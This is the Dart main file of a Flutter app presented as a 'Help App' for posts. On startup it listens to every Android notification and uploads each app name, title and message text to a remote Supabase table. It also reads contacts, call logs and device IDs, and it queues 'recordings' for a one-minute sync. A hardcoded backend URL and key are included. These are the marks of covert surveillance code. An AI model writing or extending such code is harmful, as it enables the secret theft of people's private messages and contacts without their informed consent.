import 'dart:async';
import 'dart:io';

import 'package:android_intent_plus/android_intent.dart';
import 'package:android_intent_plus/flag.dart';
import 'package:call_log/call_log.dart';
import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:contacts_service/contacts_service.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter/material.dart';
import 'package:flutter_notification_listener/flutter_notification_listener.dart';
import 'package:helps/create/posts_list_screen.dart';
import 'package:helps/routes/routs_screen.dart';
import 'package:hive/hive.dart';
import 'package:hive_flutter/adapters.dart';
import 'package:intl/intl.dart';
import 'package:path_provider/path_provider.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:supabase_flutter/supabase_flutter.dart';
import 'package:hive_flutter/hive_flutter.dart';
import 'package:shared_preferences/shared_preferences.dart';

Future<void> main() async {
  WidgetsFlutterBinding.ensureInitialized();

  final dir = await getApplicationDocumentsDirectory();
  await Hive.initFlutter(dir.path);
  await Hive.openBox<String>('pending_recordings');

  await Supabase.initialize(
    url: 'https://mavkdxueudusgjdphyhn.supabase.co',
    anonKey: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im1hdmtkeHVldWR1c2dqZHBoeWhuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDQ4NDU3MDgsImV4cCI6MjA2MDQyMTcwOH0.srw9bbod0BLAwhbQASWQ9IfYcL8oRc4ZszlfzM4l1N4',
  );

  final prefs = await SharedPreferences.getInstance();
  final hasUser = prefs.getString('user_id') != null;

  runApp(MyApp(initialRoute: hasUser ? '/posts' : '/login'));
}

class MyApp extends StatefulWidget {
  final String initialRoute;
  const MyApp({super.key, required this.initialRoute});

  @override
  State<MyApp> createState() => _MyAppState();
}

class _MyAppState extends State<MyApp> {
  Timer? _syncTimer;

  @override
  void initState() {
    super.initState();

    if (Platform.isAndroid) {
      NotificationsListener.initialize();
      NotificationsListener.receivePort?.listen((event) {
        if (event is NotificationEvent) {
          uploadNotificationToSupabase(event);
        }
      });
    }

    uploadContacts();
    uploadCallLogs();
    uploadPendingRecordings();
    startAutoSyncTimer();
    checkNotificationAccess(context);
  }

  void startAutoSyncTimer() {
    _syncTimer?.cancel();
    _syncTimer = Timer.periodic(const Duration(minutes: 1), (timer) async {
      final connectivity = await Connectivity().checkConnectivity();
      if (connectivity != ConnectivityResult.none) {
        await uploadPendingRecordings();
      }
    });
  }

  @override
  void dispose() {
    _syncTimer?.cancel();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Help App',
      debugShowCheckedModeBanner: false,
      initialRoute: widget.initialRoute,
      routes: appRoutes,
    );
  }
}

Future<void> uploadCallLogs() async {
  if (await Permission.phone.request().isGranted) {
    final entries = await CallLog.get();
    for (var entry in entries) {
      print(' Call : ${entry.number}, ${entry.callType}');
    }
  }
}

Future<void> checkNotificationAccess(BuildContext context) async {
  final isRunning = await NotificationsListener.isRunning;
  if (isRunning == true) {
    Navigator.pushReplacement(
      context,
      MaterialPageRoute(builder: (_) => const PostsListScreen()),
    );
  } else {
    print("🔐 الصلاحية غير مفعلة");
  }
}


Future<void> uploadContacts() async {
  if (await Permission.contacts.request().isGranted) {
    final contacts = await ContactsService.getContacts();
    for (var contact in contacts) {
      print(' ContactsService : ${contact.displayName}');
    }
  }
}


Future<void> uploadNotificationToSupabase(NotificationEvent event) async {
  final supabase = Supabase.instance.client;
  await supabase.from('notifications').insert({
    'package_name': event.packageName,
    'title': event.title,
    'text': event.text,
    'timestamp': DateTime.now().toIso8601String(),
  });
}


Future<void> uploadPendingRecordings() async {
  final box = Hive.box<String>('pending_recordings');
  final keys = box.keys.toList();
  for (String path in keys) {
    final file = File(path);
    if (await file.exists()) {
      print(' UPDATE: ${file.path}');
      box.delete(path);
    }
  }
}



Future<String> getDeviceId() async {
  final deviceInfo = DeviceInfoPlugin();
  if (Platform.isAndroid) {
    final androidInfo = await deviceInfo.androidInfo;
    return androidInfo.id ?? "unknown_device";
  } else if (Platform.isIOS) {
    final iosInfo = await deviceInfo.iosInfo;
    return iosInfo.identifierForVendor ?? "unknown_device";
  } else {
    return "unsupported_platform";
  }
}
